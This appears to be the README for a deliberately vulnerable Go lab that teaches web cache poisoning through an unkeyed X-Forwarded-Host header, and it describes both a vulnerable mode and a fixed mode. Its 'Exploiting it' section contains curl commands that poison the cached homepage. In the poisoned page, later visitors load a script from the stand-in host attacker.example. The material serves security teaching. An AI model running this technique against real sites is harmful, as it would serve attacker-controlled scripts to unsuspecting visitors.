# Web Cache Poisoning via Unkeyed Header

This challenge demonstrates classic web cache poisoning: the origin reflects the caller-supplied `X-Forwarded-Host` header into an absolute link and a `<script src>` on the homepage, while the shared edge cache in front of it keys responses by path only. Whoever's request populates the cache entry has their `X-Forwarded-Host` value baked into the page for every subsequent visitor.

## How to run it

```bash
go run main.go serve
```

## Endpoint

- `GET /` — HTML page containing a canonical link and a script tag built from `X-Forwarded-Host`

## Exploiting it

```bash
# poison the cache entry for "/" with an attacker-controlled host
curl -H "X-Forwarded-Host: attacker.example" http://localhost:8080/

# any subsequent visitor, even without the header, gets the poisoned response
curl http://localhost:8080/
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: X-Forwarded-Host is reflected unkeyed and the response is cached, so the first caller's header value is served to everyone
go run main.go serve --vulnerable=true

# fixed: the host is never taken from a client-controlled header, and responses are not cached
go run main.go serve --vulnerable=false
```

## Disclaimer

This challenge is intentionally vulnerable. Do not deploy it on a publicly accessible server, as this could expose you to attacks.

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
